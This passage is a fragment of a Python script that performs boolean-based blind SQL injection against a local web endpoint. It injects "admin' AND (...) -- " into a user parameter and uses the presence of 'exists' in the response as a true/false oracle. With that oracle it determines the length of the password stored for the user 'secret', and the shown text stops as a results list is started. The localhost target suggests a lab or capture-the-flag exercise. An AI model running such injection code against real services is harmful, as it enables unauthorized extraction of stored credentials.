    base = "http://127.0.0.1:8092/check?user="
    def truthy(cond):
        u = "admin' AND (%s) -- " % cond
        return "exists" in urllib.request.urlopen(base + urllib.parse.quote(u)).read().decode()
    n = next(i for i in range(1, 60) if truthy("(SELECT length(password) FROM users WHERE username='secret')=%d" % i))
    out = []
